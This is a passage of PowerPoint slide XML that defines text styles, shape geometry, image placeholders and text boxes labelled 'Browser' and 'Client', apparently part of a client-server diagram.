            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164869" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T5" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821218" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821218" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3545262"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2536732"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164872" name="object 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164873" name="object 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164874" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2176145"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T5" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2176145"/>
              <a:gd name="T7" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2176145"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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76145" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2176145" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176145" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164875" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164876" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
